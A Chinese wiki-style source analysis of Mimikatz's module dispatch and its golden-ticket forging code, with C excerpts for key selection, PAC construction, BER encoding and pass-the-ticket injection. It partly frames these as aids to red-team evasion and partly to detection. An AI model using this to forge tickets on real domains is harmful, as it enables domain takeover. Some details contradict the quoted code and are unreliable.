---
title: Mimikatz 模块调度架构与黄金票据生成核心实现深度解析
description: 深度解析 Mimikatz 模块调度架构（KUHL_M 结构）与黄金票据生成核心函数 kuhl_m_kerberos_golden 的源码实现，涵盖命令行解析分发、加密体系选型、PAC
  构造及 BER 编码序列化全流程。
category: program-analysis
tags:
- Mimikatz
- Kerberos
- Golden Ticket
- Source Code Analysis
- Windows Internals
- KUHL_M
- BER Encoding
- PAC
- Cryptography
- Red Teaming
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本页面基于对 Mimikatz 源码的深度审计，系统梳理其 **模块化调度架构（KUHL_M 体系）** 与 **黄金票据生成核心流程**（`kuhl_m_kerberos_golden`）。重点覆盖：

- 命令行参数解析与模块/命令分发机制
- KUHL_M 模块注册表结构与查找逻辑
- 黄金票据生成的加密体系选型（DES/RC4/AES128/AES256）
- PAC（Privilege Attribute Certificate）构造细节
- Kerberos 凭据的 BER 编码序列化与持久化

> **项目地址**：https://github.com/gentilkiwi/mimikatz  
> **适用场景**：红队工具开发、Kerberos 协议研究、Windows 认证机制深度分析、恶意代码分析与检测规则编写

---

## 一、整体架构：Mimikatz 模块调度体系

### 程序入口与命令分发流程

Mimikatz 入口位于 `mimikatz.c` 的 `wmain()`，核心逻辑为：

1. 初始化环境（`mimikatz_begin()`）
2. 处理启动参数或进入交互式循环
3. 通过 `mimikatz_dispatchCommand()` 分发命令

```c
// mimikatz.c - 程序入口
int wmain(int argc, wchar_t * argv[]) {
    // ... 初始化 ...
    for(i = MIMIKATZ_AUTO_COMMAND_START; i < argc; i++) {
        status = mimikatz_dispatchCommand(argv[i]);  // 处理启动参数
    }
    // ... 交互式循环 ...
    while (...) {
        fgetws(input, ...);
        status = mimikatz_dispatchCommand(input);    // 处理交互输入
    }
}
```

### 命令分发核心：`mimikatz_dispatchCommand`

```c
// mimikatz.c - 命令分发总入口
NTSTATUS mimikatz_dispatchCommand(wchar_t * input) {
    PWCHAR full = kull_m_file_fullPath(input);
    switch(full[0]) {
        case L'!': status = kuhl_m_kernel_do(full + 1); break;   // 内核模块
        case L'*': status = kuhl_m_rpc_do(full + 1); break;      // RPC 模块
        default:   status = mimikatz_doLocal(full); break;        // 本地模块（主流程）
    }
    LocalFree(full);
    return status;
}
```

> **关键点**：`mimikatz_doLocal` 是处理 `kerberos::golden` 等标准模块命令的核心分发函数。

### 本地命令解析与模块查找：`mimikatz_doLocal`

该函数实现了 **「模块名::命令名」 的两级查找**：

```c
NTSTATUS mimikatz_doLocal(wchar_t * input) {
    wchar_t ** argv = CommandLineToArgvW(input, &argc);
    wchar_t *module = NULL, *command = NULL, *match;

    // 1. 分离 "kerberos::golden" -> module="kerberos", command="golden"
    if (match = wcsstr(argv[0], L"::")) {
        module = LocalAlloc(...);
        RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
        command = match + 2;
    } else command = argv[0];

    // 2. 遍历模块注册表 mimikatz_modules[] 查找模块
    for (indexModule = 0; !moduleFound && indexModule < ARRAYSIZE(mimikatz_modules); indexModule++) {
        if (moduleFound = (!module || _wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)) {
            // 3. 在模块内查找命令
            for (indexCommand = 0; !commandFound && indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++) {
                if (commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0) {
                    // 4. 调用命令实现函数指针
                    status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
                }
            }
        }
    }
    // ... 清理 ...
}
```

> **设计亮点**：双层 `for` + `if` 短路求值，优雅实现「模块→命令」两级分发，无需哈希表即可 O(N) 查找。

---

## 二、KUHL_M 模块注册表与数据结构

### 全局模块注册表

```c
// mimikatz.h - 全局模块指针数组
const KUHL_M * mimikatz_modules[] = {
    &kuhl_m_standard,
    &kuhl_m_crypto,
    &kuhl_m_sekurlsa,
    &kuhl_m_kerberos,    // <=== Kerberos 模块（索引 3）
    &kuhl_m_ngc,
    // ... 其余模块 ...
};
```

### 模块结构体定义

```c
// kuhl_m.h - 模块元数据结构
typedef struct _KUHL_M {
    const wchar_t * shortName;        // 短名称，如 "kerberos"
    const wchar_t * fullName;         // 完整名称
    const wchar_t * description;      // 描述
    const unsigned short nbCommands;  // 命令数量
    const KUHL_M_C * commands;        // 命令数组指针
    const PKUHL_M_C_FUNC_INIT pInit;  // 初始化回调
    const PKUHL_M_C_FUNC_INIT pClean; // 清理回调
} KUHL_M, *PKUHL_M;
```

### 命令结构体定义

```c
// kuhl_m.h - 单个命令元数据
typedef struct _KUHL_M_C {
    const PKUHL_M_C_FUNC pCommand;    // 实现函数指针
    const wchar_t * command;          // 命令名，如 "golden"
    const wchar_t * description;      // 命令描述
} KUHL_M_C, *PKUHL_M_C;
```

### Kerberos 模块注册实例

```c
// kuhl_m_kerberos.c - Kerberos 模块定义
const KUHL_M kuhl_m_kerberos = {
    L"kerberos", L"Kerberos package module", L"",
    ARRAYSIZE(kuhl_m_c_kerberos), kuhl_m_c_kerberos,
    kuhl_m_kerberos_init, kuhl_m_kerberos_clean
};

// 命令表
const KUHL_M_C kuhl_m_c_kerberos[] = {
    {kuhl_m_kerberos_ptt,    L"ptt",      L"Pass-the-ticket [NT 6]"},
    {kuhl_m_kerberos_list,   L"list",     L"List ticket(s)"},
    {kuhl_m_kerberos_ask,    L"ask",      L"Ask or get TGS tickets"},
    {kuhl_m_kerberos_tgt,    L"tgt",      L"Retrieve current TGT"},
    {kuhl_m_kerberos_purge,  L"purge",    L"Purge ticket(s)"},
    {kuhl_m_kerberos_golden, L"golden",   L"Willy Wonka factory"},  // <=== 索引 5
    {kuhl_m_kerberos_hash,   L"hash",     L"Hash password to keys"},
    // ... 其余命令 ...
};
```

> **索引映射**：`kerberos::golden` 对应 `indexModule=3`（`mimikatz_modules[3]`）、`indexCommand=5`（`kuhl_m_c_kerberos[5]`）。

---

## 三、黄金票据生成核心：`kuhl_m_kerberos_golden` 深度解析

### 函数签名与核心参数

```c
// kuhl_m_kerberos.c - 黄金票据生成入口
NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[]) {
    BYTE key[AES_256_KEY_LENGTH] = {0};      // 密钥缓冲区（最大 AES256）
    DWORD keyType = 0;                       // 加密类型（ETYPE）
    DWORD id = 500;                          // 默认 RID（Administrator）
    // ... 其余变量声明 ...
}
```

### 参数解析与加密体系选型

支持四种加密体系，**优先级：AES256 > AES128 > RC4_HMAC_NT > DES_CBC_MD5**：

```c
// 解析 /des, /rc4 (或 /krbtgt), /aes128, /aes256
if (kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
    keyType = KERB_ETYPE_DES_CBC_MD5;
else if (kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) ||
         kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
    keyType = KERB_ETYPE_RC4_HMAC_NT;
else if (kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
    keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
else if (kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
    keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
```

> **关联知识**：`[[lm-ntlm-hash-generation-analysis]]` 详细解析了 NTLM Hash（RC4_HMAC_NT 密钥）的生成算法与 OpenSSL 适配细节，是理解 `/krbtgt` 参数值来源的基础。

### 密钥定位与校验

```c
status = CDLocateCSystem(keyType, &pCSystem);  // 定位加密体系实现
if (NT_SUCCESS(status)) {
    if (kull_m_string_stringToHex(szKey, key, pCSystem->KeySize)) {
        // 密钥长度校验通过
    } else {
        PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n",
                    pCSystem->KeySize * 2, pCSystem->KeySize,
                    kuhl_m_kerberos_ticket_etype(keyType));
    }
}
```

- `CDLocateCSystem`：根据 ETYPE 查找对应的 `PKERB_ECRYPT` 加密提供者（内含 `KeySize`、`Encrypt`/`Decrypt`/`Finish` 等函数指针）
- `kull_m_string_stringToHex`：将十六进制字符串转为二进制密钥，长度必须匹配 `pCSystem->KeySize`

### 时间窗口计算

```c
GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
// 对齐到分钟边界
*(PULONGLONG)&lifeTimeData.TicketStart -= *(PULONGLONG)&lifeTimeData.TicketStart % 10000000
                                        - ((LONGLONG)wcstol(szLifetime, NULL, 0) * 10000000 * 60);

lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
// /endin 默认 5256000 分钟（~10 年）
*(PULONGLONG)&lifeTimeData.TicketEnd += (ULONGLONG)10000000 * 60 * wcstoul(szLifetime, NULL, 0);
// /renewmax 默认同 endin
*(PULONGLONG)&lifeTimeData.TicketRenew += (ULONGLONG)10000000 * 60 * wcstoul(szLifetime, NULL, 0);
```

- 单位：`FILETIME`（100 纳秒间隔），`10000000` = 1 秒
- `startoffset`：向前偏移分钟数（默认 0）

### SID、组、额外 SID、Claims 解析

```c
// /sid 必选：域 SID
if (kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL)) {
    ConvertStringSidToSid(szSid, (PSID*)&pSid);  // 字符串 SID -> 二进制 SID
    // 提取 NetBIOS 域名（FQDN 首段大写）
    i = (DWORD)((PBYTE)baseDot - (PBYTE)szDomain);
    netbiosDomain = LocalAlloc(LPTR, i + sizeof(wchar_t));
    for (j = 0; j < i / sizeof(wchar_t); j++) netbiosDomain[j] = towupper(szDomain[j]);
}

// /id 用户 RID（默认 500）
kull_m_string_args_byName(argc, argv, L"id", &szId, NULL);
id = wcstoul(szId, NULL, 0);

// /groups 组 RID 列表（逗号分隔）
kuhl_m_pac_stringToGroups(szGroups, &groups, &nbGroups);

// /sids 额外 SID 列表（分号分隔）
kuhl_m_pac_stringToSids(szSids, &sids, &nbSids);

// /claims 声明集（JSON 格式）
pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
```

> **PAC 构造关键**：上述参数最终汇聚进 `kuhl_m_kerberos_golden_data`，由其构造 **PAC_INFO_BUFFER** 链（LogonInfo、CredentialsInfo、ServerChecksum、KDCChecksum、Claims 等），详见 3.7 节。

### 服务/目标主体名（SPN）支持

```c
kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);  // 如 "krbtgt", "cifs/host"
kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);    // 目标域/主机
```

- `service`：指定票据的服务主体名称（SPN），默认为 `krbtgt/<domain>`
- `target`：目标域名，用于跨域 TGT 伪造

### 核心数据构造：`kuhl_m_kerberos_golden_data`

```c
PBERVAL BerApp_KrbCred = kuhl_m_kerberos_golden_data(
    szUser, szDomain, szService, szTarget, &lifeTimeData,
    key, pCSystem->KeySize, keyType,
    pSid, netbiosDomain, id,
    groups, nbGroups, sids, nbSids, rodc, pClaimsSet
);
```

该函数完成 **完整的 KRB_CRED 结构构造与 BER 编码**，主要步骤：

| 步骤 | 说明 |
|------|------|
| 1. 构造 `KERB_TICKET` | 填充 `TicketFlags`、`KeyType`、`Key`（会话密钥）、`StartTime`/`EndTime`/`RenewUntil`、`ClientName`/`ClientRealm`/`ServerName`/`ServerRealm` |
| 2. 生成会话密钥 | 随机生成或派生，用于后续 AP-REQ 加密 |
| 3. **构造 PAC** | 调用 `kuhl_m_pac_create()` 组装 `PACTYPE`：<br>• `LogonInfo` (KERB_VALIDATION_INFO) — 用户 SID、组、权限、登录脚本等<br>• `CredentialsInfo` — 补充凭证（可选）<br>• `ServerChecksum` — 服务端校验和（用服务密钥 HMAC）<br>• `KDCChecksum` — KDC 校验和（用 krbtgt 密钥 HMAC）<br>• `Claims` — 资源属性声明（Windows 2012+） |
| 4. 将 PAC 放入 `AuthorizationData` | `KERB_AUTH_DATA` 类型为 `KERB_AUTH_DATA_TOKEN_RESTRICTIONS` (128) |
| 5. 使用 `key`（krbtgt 密钥）加密 `EncTicketPart` | 调用 `pCSystem->Encrypt()`，ETYPE 由 `keyType` 决定 |
| 6. 组装 `KRB_CRED` | 包含 `tickets[]`、`enc-part`（加密后的 `KRB_CRED_ENC_PART`，含会话密钥、票据副本等） |
| 7. **BER 编码序列化** | 调用 `ber_encode_KRB_CRED()` 生成 `PBERVAL`（`bv_val`/`bv_len`），即最终的 `.kirbi` 二进制内容 |

> **BER 编码细节**：Mimikatz 内置轻量 ASN.1/BER 编码器（`kull_m_asn1.c`），手工实现 `KRB_CRED`、`EncTicketPart`、`PAC` 等结构的编码，无依赖外部库。

### 输出持久化或 Pass-the-Ticket

```c
if (BerApp_KrbCred) {
    if (isPtt) {  // /ptt 参数
        if (NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
            kprintf(L"Golden ticket ... successfully submitted for current session\n");
    } else {      // 写文件
        if (kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
            kprintf(L"Final Ticket Saved to file !\n");
    }
    ber_bvfree(BerApp_KrbCred);
}
```

- `/ptt`：直接注入当前会话的 Kerberos 缓存（LSASS），无落地文件
- 默认写入 `ticket.kirbi`，可被 Rubeus、Kekeo 等工具复用

---

## 四、关键数据结构速查表

| 结构体 | 定义位置 | 核心字段 | 用途 |
|--------|----------|----------|------|
| `KUHL_M` | `kuhl_m.h` | `shortName`, `commands`, `nbCommands` | 模块元数据 |
| `KUHL_M_C` | `kuhl_m.h` | `pCommand`, `command`, `description` | 命令元数据 |
| `PKERB_ECRYPT` | `kerberos.h` | `KeySize`, `Encrypt`, `Decrypt`, `Finish` | 加密体系抽象 |
| `KUHL_M_KERBEROS_LIFETIME_DATA` | `kuhl_m_kerberos.h` | `TicketStart`, `TicketEnd`, `TicketRenew` | 时间窗口 |
| `PACTYPE` / `PAC_INFO_BUFFER` | `kerberos.h` | `cBuffers`, `Buffers[]` | PAC 容器 |
| `KERB_VALIDATION_INFO` | `ntsecapi.h` | `UserId`, `GroupIds`, `SidCount`, `ExtraSids` | PAC LogonInfo 核心 |
| `PBERVAL` | `kull_m_asn1.h` | `bv_val`, `bv_len` | BER 编码结果 |

---

## 五、调试与分析建议

### 断点设置建议

| 断点位置 | 目的 |
|----------|------|
| `mimikatz.c: wmain()` | 观察参数传入、初始化流程 |
| `mimikatz.c: mimikatz_doLocal()` | 观察模块/命令查找逻辑、`argv` 分离 |
| `kuhl_m_kerberos.c: kuhl_m_kerberos_golden()` | 核心参数解析、加密体系选型、时间计算 |
| `kuhl_m_kerberos.c: kuhl_m_kerberos_golden_data()` | PAC 构造、票据加密、BER 编码全流程 |
| `kull_m_asn1.c: ber_encode_*()` | 观察 ASN.1 编码细节 |

### 关键变量监控

- `keyType` / `pCSystem->KeySize`：确认加密算法与密钥长度匹配
- `lifeTimeData` 三个 `FILETIME`：验证时间窗口是否符合预期
- `pSid` / `netbiosDomain` / `id` / `groups` / `sids` / `pClaimsSet`：PAC 核心字段
- `BerApp_KrbCred->bv_len`：最终票据大小（通常 8-12 KB，文章提到 9 MB 可能为误记或特殊构造）

### 常见问题排查

| 现象 | 可能原因 | 定位方向 |
|------|----------|----------|
| `PRINT_ERROR("Krbtgt key size length must be ...")` | 密钥十六进制长度与 ETYPE 不匹配 | 检查 `keyType` 与输入 `/krbtgt`、`/aes256` 等参数对应关系 |
| `CDLocateCSystem` 返回非 0 | 系统不支持该 ETYPE（如 XP 无 AES） | 检查 `pCSystem` 是否为 `NULL`，尝试降级至 RC4 |
| 生成票据无法使用 | PAC 校验和计算错误、SID 格式错误 | 断点 `kuhl_m_pac_create`、`kuhl_m_pac_sign`，对比真实 TGT PAC 结构 |
| `.kirbi` 文件损坏 | BER 编码长度字段错误 | 监控 `ber_encode_KRB_CRED` 返回值，检查 `bv_len` 与实际写入长度 |

---

## 六、扩展阅读与关联页面

- `[[lm-ntlm-hash-generation-analysis]]` — LM/NTLM Hash 生成算法与 OpenSSL 适配，直接关联 `/krbtgt` 参数值的来源
- `[[windows-syscall-internals-sysenter-kifastcallentry]]` — Windows 系统调用机制，理解 LSASS 交互与票据注入底层
- `[[phantom-dll-hollowing-technique]]` — 内存注入与模块伪装技术，可结合 `/ptt` 免杀思路研究
- `[[pe-export-table-internals]]` — PE 导出表解析，辅助理解 `CDLocateCSystem` 等内部函数定位方式
- `[[mfc-message-map-internals-reverse-engineering]]` — MFC 消息映射逆向模式，对比 Mimikatz 自建分发机制的异同

---

## 七、总结

Mimikatz 通过 **KUHL_M 模块注册表 + 双层线性查找** 实现了轻量级、可扩展的命令分发架构。黄金票据生成 `kuhl_m_kerberos_golden` 展示了：

1. **参数驱动的加密体系选型**（DES/RC4/AES128/AES256）
2. **标准化的时间窗口计算**（FILETIME 精度、分钟对齐）
3. **完整的 PAC 构造流程**（LogonInfo、Checksums、Claims）
4. **自包含的 BER 编码序列化**（无外部 ASN.1 库依赖）
5. **双模式输出**（文件落地 `/ticket` 与无文件 `/ptt`）

理解上述流程不仅有助于红队工具二次开发与免杀，更为 Kerberos 协议安全审计、黄金/白银票据检测规则编写（如基于 PAC 校验和异常、ETYPE 降级、异常时间窗口等）提供了坚实的代码级依据。

> **安全提示**：本页面仅供安全研究与防御分析使用，请勿用于未授权渗透测试或非法用途。实战中请遵守当地法律法规与授权范围。

## 来源

- [0x00实验室-202108-202304_028](../sources/0x00实验室-202108-202304_028.md)
